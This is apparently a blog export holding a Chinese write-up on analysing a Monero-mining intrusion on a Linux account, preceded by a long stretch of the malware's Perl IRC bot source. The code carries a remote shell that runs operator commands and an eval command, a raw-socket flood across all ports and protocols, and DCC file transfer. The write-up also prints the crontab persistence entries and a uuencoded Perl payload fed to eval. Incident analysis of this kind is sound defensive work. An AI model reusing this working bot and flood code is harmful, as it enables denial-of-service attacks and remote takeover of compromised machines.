/^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^invite\\s+(\\S+) (.*)/) {\n      invite(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   elsif ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   elsif ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {\n      DCC::SEND(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   elsif ($case =~ /^eval (.*)/) {\n      eval \"$1\";\n   }\n   elsif ($case =~ /^entra\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    j(\"$1\");\n   }\n   elsif ($case =~ /^sai\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    p(\"$1\");\n   }\n   elsif ($case =~ /^sair/) {\n     quit();\n   }\n   elsif ($case =~ /^novonick/) {\n    my $novonick = getnick();\n     nick(\"$novonick\");\n   }\n   elsif ($case =~ /^estatisticas (.*)/) {\n     if ($1 eq \"on\") {\n      $estatisticas = 1;\n      msg(\"$printl\", \"Estat.sticas ativadas!\");\n     } elsif ($1 eq \"off\") {\n      $estatisticas = 0;\n      msg(\"$printl\", \"Estat.sticas desativadas!\");\n     }\n   }\n   elsif ($case =~ /^pacotes (.*)/) {\n     if ($1 eq \"on\") {\n      $pacotes = 1;\n      msg(\"$printl\", \"Pacotes ativados!\") if ($estatisticas == \"1\");\n     } elsif ($1 eq \"off\") {\n      $pacotes = 0;\n      msg(\"$printl\", \"Pacotes desativados!\") if ($estatisticas == \"1\");\n     }\n   }\n}\nsub shell {\n  return unless $acessoshell;\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"Diret.rio inexistente!\");\n    return;\n  }\n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c >= \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\n\nsub attacker {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'B' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n\n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65535; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);\n\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\n\n\nsub action {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub hop {\n    return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub dehop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub voice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +v $_[1]\");\n}\nsub devoice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -v $_[1]\");\n}\nsub ban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +b $_[1]\");\n}\nsub unban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -b $_[1]\");\n}\nsub kick {\n   return unless $#_ == 1;\n   sendraw(\"KICK $_[0] $_[1] :$_[2]\");\n}\n\nsub modo {\n   return unless $#_ == 0;\n   sendraw(\"MODE $_[0] $_[1]\");\n}\nsub mode { modo(@_); }\n\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {sendraw(\"PART $_[0]\");}\n\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\n\nsub invite {\n   return unless $#_ == 1;\n   sendraw(\"INVITE $_[1] $_[0]\");\n}\nsub topico {\n   return unless $#_ == 1;\n   sendraw(\"TOPIC $_[0] $_[1]\");\n}\nsub topic { topico(@_); }\n\nsub whois {\n  return unless $#_ == 0;\n  sendraw(\"WHOIS $_[0]\");\n}\nsub who {\n  return unless $#_ == 0;\n  sendraw(\"WHO $_[0]\");\n}\nsub names {\n  return unless $#_ == 0;\n  sendraw(\"NAMES $_[0]\");\n}\nsub away {\n  sendraw(\"AWAY $_[0]\");\n}\nsub back { away(); }\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n  exit;\n}\n\npackage DCC;\n\nsub connections {\n   my @ready = $dcc_sel->can_read(1);\n   foreach my $fh (@ready) {\n     my $dcctipo = $DCC{$fh}{tipo};\n     my $arquivo = $DCC{$fh}{arquivo};\n     my $bytes = $DCC{$fh}{bytes};\n     my $cur_byte = $DCC{$fh}{curbyte};\n     my $nick = $DCC{$fh}{nick};\n\n     my $msg;\n     my $nread = sysread($fh, $msg, 10240);\n\n     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {\n        $DCC{$fh}{status} = \"Cancelado\";\n        $DCC{$fh}{ftime} = time;\n        $dcc_sel->remove($fh);\n        $fh->close;\n        next;\n     }\n\n     if ($dcctipo eq \"get\") {\n        $DCC{$fh}{curbyte} += length($msg);\n\n        my $cur_byte = $DCC{$fh}{curbyte};\n\n        open(FILE, \">> $arquivo\");\n        print FILE \"$msg\" if ($cur_byte <= $bytes);\n        close(FILE);\n\n        my $packbyte = pack(\"N\", $cur_byte);\n        print $fh \"$packbyte\";\n\n        if ($bytes == $cur_byte) {\n           $dcc_sel->remove($fh);\n           $fh->close;\n           $DCC{$fh}{status} = \"Recebido\";\n           $DCC{$fh}{ftime} = time;\n           next;\n        }\n     } elsif ($dcctipo eq \"send\") {\n          my $send = $fh->accept;\n          $send->autoflush(1);\n          $dcc_sel->add($send);\n          $dcc_sel->remove($fh);\n          $DCC{$send}{tipo} = 'sendcon';\n          $DCC{$send}{itime} = time;\n          $DCC{$send}{nick} = $nick;\n          $DCC{$send}{bytes} = $bytes;\n          $DCC{$send}{curbyte} = 0;\n          $DCC{$send}{arquivo} = $arquivo;\n          $DCC{$send}{ip} = $send->peerhost;\n          $DCC{$send}{porta} = $send->peerport;\n          $DCC{$send}{status} = \"Enviando\";\n\n          open(FILE, \"< $arquivo\");\n          my $fbytes;\n          read(FILE, $fbytes, 1024);\n          print $send \"$fbytes\";\n          close FILE;\n     } elsif ($dcctipo eq 'sendcon') {\n          my $bytes_sended = unpack(\"N\", $msg);\n          $DCC{$fh}{curbyte} = $bytes_sended;\n          if ($bytes_sended == $bytes) {\n             $fh->close;\n             $dcc_sel->remove($fh);\n             $DCC{$fh}{status} = \"Enviado\";\n             $DCC{$fh}{ftime} = time;\n             next;\n          }\n          open(SENDFILE, \"< $arquivo\");\n          seek(SENDFILE, $bytes_sended, 0);\n          my $send_bytes;\n          read(SENDFILE, $send_bytes, 1024);\n          print $fh \"$send_bytes\";\n          close(SENDFILE);\n     }\n   }\n}\n\n\nsub SEND {\n  my ($nick, $arquivo) = @_;\n  unless (-r \"$arquivo\") {\n    return(0);\n  }\n\n  my $dccark = $arquivo;\n  $dccark =~ s/[.*\\/](\\S+)/$1/;\n\n  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};\n  my $longip = unpack(\"N\",inet_aton($meuip));\n\n  my @filestat = stat($arquivo);\n  my $size_total=$filestat[7];\n  if ($size_total == 0) {\n     return(0);\n  }\n\n  my ($porta, $sendsock);\n  do {\n    $porta = int rand(64511);\n    $porta += 1024;\n    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);\n  } until $sendsock;\n\n  $DCC{$sendsock}{tipo} = 'send';\n  $DCC{$sendsock}{nick} = $nick;\n  $DCC{$sendsock}{bytes} = $size_total;\n  $DCC{$sendsock}{arquivo} = $arquivo;\n\n\n  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");\n\n}\n\nsub GET {\n  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;\n  return(0) if (-e \"$arquivo\");\n  if (open(FILE, \"> $arquivo\")) {\n     close FILE;\n  } else {\n    return(0);\n  }\n\n  my $dccip=fixaddr($dcclongip);\n  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);\n  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);\n  $dccsock->autoflush(1);\n  $dcc_sel->add($dccsock);\n  $DCC{$dccsock}{tipo} = 'get';\n  $DCC{$dccsock}{itime} = time;\n  $DCC{$dccsock}{nick} = $nick;\n  $DCC{$dccsock}{bytes} = $bytes;\n  $DCC{$dccsock}{curbyte} = 0;\n  $DCC{$dccsock}{arquivo} = $arquivo;\n  $DCC{$dccsock}{ip} = $dccip;\n  $DCC{$dccsock}{porta} = $dccporta;\n  $DCC{$dccsock}{status} = \"Recebendo\";\n}\n\nsub Status {\n  my $socket = shift;\n  my $sock_tipo = $DCC{$socket}{tipo};\n  unless (lc($sock_tipo) eq \"chat\") {\n    my $nick = $DCC{$socket}{nick};\n    my $arquivo = $DCC{$socket}{arquivo};\n    my $itime = $DCC{$socket}{itime};\n    my $ftime = time;\n    my $status = $DCC{$socket}{status};\n    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});\n\n    my $d_time = $ftime-$itime;\n\n    my $cur_byte = $DCC{$socket}{curbyte};\n    my $bytes_total =  $DCC{$socket}{bytes};\n\n    my $rate = 0;\n    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;\n    my $porcen = ($cur_byte*100)/$bytes_total;\n\n    my ($r_duv, $p_duv);\n    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $r_duv = $3; $r_duv++ if $4 >= 5;\n       $rate = \"$1\\.$2\".\"$r_duv\";\n    }\n    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $p_duv = $3; $p_duv++ if $4 >= 5;\n       $porcen = \"$1\\.$2\".\"$p_duv\";\n    }\n    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");\n  }\n\n\n  return(0);\n}\n\n\nsub fixaddr {\n    my ($address) = @_;\n\n    chomp $address;     \n    if ($address =~ /^\\d+$/) {\n        return inet_ntoa(pack \"N\", $address);\n    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {\n        return $address;\n    } elsif ($address =~ tr/a-zA-Z//) {                    \n        return inet_ntoa(((gethostbyname($address))[4])[0]);\n    } else {\n        return;\n    }\n}\n```\n\n\n\n","slug":"Mining-malware-analysis","published":1,"updated":"2023-04-20T07:41:28.343Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmz000fi7ricnmugoqj","content":"<h1 id=\"Mining-malware-analysis\"><a href=\"#Mining-malware-analysis\" class=\"headerlink\" title=\"Mining malware analysis\"></a>Mining malware analysis</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.imgur.com/nkRApHa.png\"></p>\n<p>大量的 ip 對 107.191.99.95 的 port 80 進行連線，且發現每次重開機後都會重新連線，應該是有開機自啟動。</p>\n<p><code>107.191.99.95</code></p>\n<p><img src=\"https://i.imgur.com/GnEg6vz.png\"></p>\n<p>經調查是門羅幣的挖礦</p>\n<p>再來分析，使用的程式 cron</p>\n<p>PID 為 1475</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -aux |grep 1475 </span><br></pre></td></tr></table></figure>\n\n<p>發現是 .&#x2F;cron </p>\n<p>使用者居然是 test2 (看來是同學帳號亂建立，被暴力入侵而得)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find . -name cron*</span><br></pre></td></tr></table></figure>\n\n<p>找到檔案 cron.d</p>\n<p><img src=\"https://i.imgur.com/Gb4mMEM.png\"></p>\n<p>&#x2F;home&#x2F;test2&#x2F;.firefoxcatche&#x2F;cron.d</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* */12 * * * /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">@reboot /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">5 8 * * 0 /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">@reboot /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1  </span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">5 1 * * * /tmp/.X13-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>test2 帳號的 crontab</p>\n<p><img src=\"https://i.imgur.com/b5yebu5.png\"></p>\n<p>被放了什麼東西進來</p>\n<p><img src=\"https://i.imgur.com/TeZPyGv.png\"></p>\n<p>主要的惡意程式邏輯應該在 .firefoxcatche</p>\n<p><img src=\"https://i.imgur.com/gQbEd8g.png\"></p>\n<p>cron.d 是最後要執行的程式</p>\n<p><img src=\"https://i.imgur.com/hxyv055.png\"></p>\n<p>會執行 </p>\n<p>a&#x2F;upd<br>@reboot 後 a&#x2F;upd</p>\n<p>b&#x2F;sync<br>@reboot 後 b&#x2F;sync</p>\n<p>&#x2F;tmp&#x2F;.X13-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude</p>\n<p>先來看 a 資料夾</p>\n<p><img src=\"https://i.imgur.com/4omAw3I.png\"></p>\n<p>a&#x2F;a</p>\n<p><img src=\"https://i.imgur.com/YxI5D8p.png\"></p>\n<p>a&#x2F;upd</p>\n<p><img src=\"https://i.imgur.com/LoWQJ9U.png\"></p>\n<p>a&#x2F;stop</p>\n<p><img src=\"https://i.imgur.com/dxkmnum.png\"></p>\n<p>a&#x2F;run</p>\n<p><img src=\"https://i.imgur.com/NZy6EmR.png\"></p>\n<p>a&#x2F;init0</p>\n<p>看起來是自毀程式</p>\n<p><img src=\"https://i.imgur.com/iYZIrHO.png\"></p>\n<p>最後會執行 anacron 這個執行檔案</p>\n<p>再來是 b 資料夾</p>\n<p><img src=\"https://i.imgur.com/zDc1NE8.png\"></p>\n<p>b&#x2F;a</p>\n<p><img src=\"https://i.imgur.com/kqS6OOl.png\"></p>\n<p>b&#x2F;sync</p>\n<p><img src=\"https://i.imgur.com/H6Hdy2a.png\"></p>\n<p>b&#x2F;ps</p>\n<p>二進位執行檔案</p>\n<p>b&#x2F;rsync</p>\n<p><img src=\"https://i.imgur.com/nQgpx0Z.png\"></p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span> <span class=\"keyword\">unpack</span> <span class=\"string\">u=&gt;</span><span class=\"string\">q&#123;_&quot;FUY(&quot;1P&lt;F]C97-S;R`](&quot;=R&lt;WEN8R&lt;[&quot;@HD&lt;V5R=FED;W(])S4N,C4U+C@V+C$R.2&lt;@=6YL97-S(&quot;1S97)V_:61O&lt;CL*;7D@)&#x27;!O&lt;G1A/2&lt;T-#,G.PIM&gt;2!`8V%N86ES/2@B(S`P-R(I.PIM&gt;2!`861M&lt;STH(D$B+&quot;)8(BD[_&quot;FUY($!A=71H/2@B;&amp;]C86QH;W-T(BD[&quot;@IM&gt;2`D;&amp;EN87-?;6%X/38[&quot;FUY(&quot;1S;&amp;5E&lt;#TS.PH*;7D@)&amp;YI_8VL@/2!G971N:6-K*&quot;D[&quot;FUY(&quot;1I&lt;F-N86UE(#T@9V5T;FEC:R@I.PIM&gt;2`D&lt;F5A;&amp;YA;64@/2`H8&#x27;5N86UE_(&quot;UA8&quot;D[&quot;@IM&gt;2`D86-E&lt;W-O&lt;VAE;&amp;P@/2`Q.PIM&gt;2`D&lt;&#x27;)E9FEX;R`](&quot;(A(&quot;([&quot;FUY(&quot;1E&lt;W1A=&amp;ES=&amp;EC_87,@/2`P.PIM&gt;2`D&lt;&amp;%C;W1E&lt;R`](#$[&quot;@IM&gt;2`D5D524T%/(#T@)S`N,F$G.PH*)%-)1WLG24Y4)WT@/2`G_24=.3U)%)SL*)%-)1WLG2%50)WT@/2`G24=.3U)%)SL*)%-)1WLG5$5232=](#T@)TE&#x27;3D]212&lt;[&quot;B1324=[_)T-(3$0G?2`](&quot;=)1TY/4D4G.PHD4TE&#x27;&gt;R=04R=](#T@)TE&#x27;3D]212&lt;[&quot;@IU&lt;V4@24\\Z.E-O8VME=#L*=7-E_(%-O8VME=#L*=7-E($E/.CI396QE8W0[&quot;F-H9&amp;ER*&quot;(O(BD[&quot;B1S97)V:61O&lt;CTB)$%21U9;,%TB(&amp;EF(&quot;1!_4D=66S!=.PHD,#TB)&#x27;!R;V-E&lt;W-O(BXB7#`B.PIM&gt;2`D&lt;&amp;ED/69O&lt;FL[&quot;F5X:70@:68@)&#x27;!I9#L*9&amp;EE(&quot;)0_&lt;F]B;&amp;5M82!C;VT@;R!F;W)K.B`D(2(@=6YL97-S(&amp;1E9FEN960H)&#x27;!I9&quot;D[&quot;@IM&gt;2`E:7)C7W-E&lt;G9E&lt;G,[_&quot;FUY(&quot;5$0T,[&quot;FUY(&quot;1D8V-?&lt;V5L(#T@;F5W($E/.CI396QE8W0M/FYE=R@I.PH*&quot;@H*&lt;W5B(&amp;=E=&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B`B&gt;&quot;(N:6YT*&#x27;)A;F0H.3`P,&quot;DI.PI]&quot;@H*&lt;W5B(&amp;=E=&amp;ED96YT(&#x27;L*(&quot;!M&gt;2`D&lt;F5T;W)N_;VED96YT(#T@)E]G970H(FAT=&#x27;`Z+R]W=W&lt;N;6EN&lt;&amp;]P+F-O;2]S:S$R&lt;&amp;%C:R]I9&amp;5N=&#x27;,N&lt;&amp;AP(BD[&quot;B`@_;7D@)&amp;ED96YT8VAA;F-E(#T@:6YT*&#x27;)A;F0H,3`P,&quot;DI.PH@(&amp;EF(&quot;@D:61E;G1C:&amp;%N8V4@/B`S,&quot;D@&gt;PH@_(&quot;`@(&#x27;)E=&#x27;5R;B`D;FEC:SL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&#x27;)E=&#x27;5R;B`D&lt;F5T;W)N;VED96YT.PH@(&#x27;T*(&quot;!R_971U&lt;FX@)&#x27;)E=&amp;]R;F]I9&amp;5N=#L*?0H*&lt;W5B(&amp;=E=&amp;YA;64@&gt;PH@(&amp;UY(&quot;1R971O&lt;FYO;F%M92`](&quot;9?9V5T_*&quot;)H=&#x27;1P.B\\O=W=W+FUI;G!O&lt;&quot;YC;VTO&lt;VLQ,G!A8VLO;F%M97,N&lt;&amp;AP(BD[&quot;B`@&lt;F5T=7)N(&quot;1R971O&lt;FYO_;F%M93L*?0H*&lt;W5B(&amp;=E=&amp;ED96YT,B![&quot;B`@(&quot;`@(&quot;`@;7D@)&amp;QE;F=T:#US:&amp;EF=#L*(&quot;`@(&quot;`@(&quot;`D;&amp;5N_9W1H(#T@,R!I9B`H)&amp;QE;F=T:&quot;`\\(#,I.PH*(&quot;`@(&quot;`@(&quot;!M&gt;2!`8VAA&lt;G,]*&quot;=A)RXN)WHG+&quot;=!)RXN)UHG_+&quot;&lt;Q)RXN)SDG*3L*(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&quot;@Q+BXD;&amp;5N9W1H*0H@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;1R86YD;VUS=&#x27;)I;F&lt;N/21C:&amp;%R&lt;UMR86YD($!C:&amp;%R&lt;UT[&quot;B`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R_;B`D&lt;F%N9&amp;]M&lt;W1R:6YG.PI]&quot;@IS=6(@9V5T&lt;W1O&lt;F4@*&quot;0D*0I[&quot;B`@;7D@)&#x27;5R;&quot;`](&#x27;-H:69T.PH@(&amp;UY_(&quot;1F:6QE(#T@&lt;VAI9G0[&quot;@H@(&quot;1H=&#x27;1P7W-T&lt;F5A;5]O=70@/2`Q.PH@(&amp;]P96XH1T547T]55$9)3$4L(&quot;(^_(&quot;1F:6QE(BD[&quot;B`@)6AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:R`](&quot;@I.PH@(%]G970H)&#x27;5R;&quot;D[&quot;B`@8VQO&lt;V4@1T547T]5_5$9)3$4[&quot;B`@&lt;F5T=7)N(&quot;1M86EN.CIH=&#x27;1P7V=E=%]R97-U;&#x27;0[&quot;GT*&quot;G-U8B!?9V5T&quot;GL*(&quot;!M&gt;2`D=7)L_(#T@&lt;VAI9G0[&quot;B`@;7D@)&#x27;!R;WAY(#T@(B([&quot;B`@9W)E&lt;&quot;![*&amp;QC*&quot;1?*2!E&lt;2`B:&#x27;1T&lt;%]P&lt;F]X&gt;2(I(&quot;8F_(&quot;@D&lt;&#x27;)O&gt;&#x27;D@/2`D14Y6&gt;R1??2E](&amp;ME&gt;7,@)45.5CL*(&quot;!I9B`H*&quot;1P&lt;F]X&gt;2!E&lt;2`B(BD@)B8@)&#x27;5R;&quot;`]_?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDH/SHZ*%QD*RDI/R@O7%,J*3\\D+&quot;D@&gt;PH@(&quot;`@;7D@)&amp;AO&lt;W0@/2`D,3L*_(&quot;`@(&amp;UY(&quot;1P;W)T(#T@)#(@?&#x27;P@.#`[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;%T:&quot;`](&quot;0S.PH@(&quot;`@)&#x27;!A=&amp;@@/2`B+R(@=6YL_97-S(&amp;1E9FEN960H)&#x27;!A=&amp;@I.PH@(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@_)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS:68@*&quot;1P&lt;F]X&gt;2`]?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDZ*%QD*RDH+UQ3*BD_)&quot;PI_(&#x27;L*(&quot;`@(&amp;UY(&quot;1H;W-T(#T@)#$[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;]R=&quot;`](&quot;0R.PH@(&quot;`@;7D@)&#x27;!A=&amp;@@/2`D=7)L.PH@_(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS92![&quot;B`@_(&quot;!R971U&lt;FX@=6YD968[&quot;B`@?0I]&quot;@H*&lt;W5B(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T&quot;GL*(&quot;!M&gt;2@D:&amp;]S=&quot;P@)&#x27;!O_&lt;G0L(&quot;1P871H*2`]($!?.PH@(&amp;UY*&quot;1!1T5.5&quot;P@)%9%4E-)3TXL(&quot;1P*3L*&quot;B`@)$%&#x27;14Y4(#T@(F=E=&quot;UM_:6YI;6%L(CL*(&quot;`D5D524TE/3B`](&quot;(R,#`P,#$Q.&quot;([&quot;@H@(&quot;1P871H(#U^(&#x27;,O(&quot;\\E,C`O9SL*&quot;B`@&lt;F5Q_=6ER92!)3SHZ4V]C:V5T.PH@(&amp;QO8V%L*&quot;1&gt;5RD@/2`P.PH@(&amp;UY(&quot;1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%_5&quot;T^;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!E_97)0;W)T(#T^(&quot;1P;W)T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!R;W1O(&quot;`@/3X@_)W1C&lt;&quot;&lt;L&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@5&amp;EM96]U=&quot;`@/3X@-C`I(&#x27;Q\\(&#x27;)E_=&#x27;5R;CL*(&quot;`D&lt;V]C:RT^875T;V9L=7-H.PH@(&amp;UY(&quot;1N971L;V,@/2`D:&amp;]S=#L*(&quot;`D;F5T;&amp;]C(&quot;X](&quot;(Z_)&#x27;!O&lt;G0B(&amp;EF(&quot;1P;W)T(&quot;$](#@P.PH@(&amp;UY(&quot;1R97%U97-T(#T@(D=%5&quot;`D&lt;&amp;%T:&quot;!(5%10+S$N,%PP,35&lt;_,#$R(@H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;X@(DAO&lt;W0Z(&quot;1N971L;V-&lt;,#$U7#`Q,B(*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`N(&quot;)5_&lt;V5R+4%G96YT.B`D04=%3E0O)%9%4E-)3TXO=5PP,35&lt;,#$R(CL*(&quot;`D&lt;F5Q=65S=&quot;`N/2`B4&#x27;)A9VUA.B!N_;RUC86-H95PP,35&lt;,#$R(B!I9B`H)&amp;UA:6XZ.FAT=&#x27;!?;F]?8V%C:&amp;4I.PH@(&quot;1R97%U97-T(&quot;X](&quot;)&lt;,#$U_7#`Q,B([&quot;B`@&lt;&#x27;)I;G0@)&#x27;-O8VL@)&#x27;)E&lt;75E&lt;W0[&quot;@H@(&amp;UY(&quot;1B=68@/2`B(CL*(&quot;!M&gt;2`D;CL*(&quot;!M&gt;2`D_8C$@/2`B(CL*(&quot;!W:&amp;EL92`H)&amp;X@/2!S&gt;7-R96%D*&quot;1S;V-K+&quot;`D8G5F+&quot;`X*C$P,C0L(&amp;QE;F=T:&quot;@D8G5F_*2DI(&#x27;L*(&quot;`@(&amp;EF(&quot;@D8C$@97$@(B(I(&#x27;L@&quot;B`@(&quot;`@(&quot;1B,2`](&quot;1B=68[(&quot;`@(&quot;`@(&quot;`@&quot;B`@(&quot;`@(&quot;1B_=68@/7X@&lt;R\\N*S]&lt;,#$U/UPP,3)&lt;,#$U/UPP,3(O+W,[(&quot;`@(&quot;`@&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&amp;AT=&#x27;!?&lt;W1R_96%M7V]U=&quot;D@&gt;R!P&lt;FEN=&quot;!&#x27;151?3U541DE,12`D8G5F.R`D8G5F(#T@(B([(&#x27;T*(&quot;!]&quot;B`@&lt;F5T=7)N(&#x27;5N_9&amp;5F(&#x27;5N;&amp;5S&lt;R!D969I;F5D*&quot;